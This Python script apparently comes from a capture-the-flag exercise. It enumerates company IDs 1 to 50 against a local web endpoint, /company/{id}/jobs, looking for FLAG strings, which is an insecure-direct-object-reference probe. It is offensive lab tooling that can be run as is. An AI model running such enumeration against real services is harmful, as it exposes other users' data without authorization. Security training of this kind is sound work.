import requests
import re

TARGET_URL = "http://127.0.0.1:32945/company/{id}/jobs"
FLAG_PATTERN = re.compile(r'FLAG\{[^}]+\}')

found_flags = []
rate_limited = False

print(f"[INFO] Starting enumeration of /company/{{id}}/jobs for IDs 1-50")
print("-" * 80)

for company_id in range(1, 51):
    url = TARGET_URL.format(id=company_id)
    
    try:
        response = requests.get(url, timeout=5)
        
        # Check for rate limiting
        if response.status_code == 429:
            print(f"\n[!] Rate limited at company ID {company_id}. Stopping enumeration.")
            rate_limited = True
            break
            
        # Check for flags in response
        flags = FLAG_PATTERN.findall(response.text)
        
        if flags:
            print(f"\n[SUCCESS] Company ID {company_id} | Status: {response.status_code}")
            print(f"[Full Response]:\n{response.text}")
            print(f"[FLAGS]:")
            for flag in flags:
                print(f"  - {flag}")
            print("-" * 80)
            
            found_flags.append({
                'company_id': company_id,
                'status_code': response.status_code,
                'flags': flags,
                'response_body': response.text
            })
        else:
            print(f"[-] Company ID {company_id} | Status: {response.status_code} | Length: {len(response.text)} bytes")
            
    except requests.exceptions.ConnectionError as e:
        print(f"\n[!] Connection error at company ID {company_id}: {e}")
        print("[-] Stopping enumeration due to connection issues.")
        break
    except requests.exceptions.Timeout:
        print(f"\n[!] Timeout at company ID {company_id} - continuing...")
        continue
    except Exception as e:
        print(f"\n[!] Unexpected error at company ID {company_id}: {e}")
        continue

# Final summary
print("\n" + "=" * 80)
print("ENUMERATION COMPLETE")
print("=" * 80)
print(f"Total flags found: {len(found_flags)}")

if found_flags:
    print("\nAll discovered flags:")
    for item in found_flags:
        for flag in item['flags']:
            print(f"  - Company ID {item['company_id']}: {flag}")

if rate_limited:
    print("\n[!] WARNING: Rate limiting detected. Some company IDs may not have been tested.")
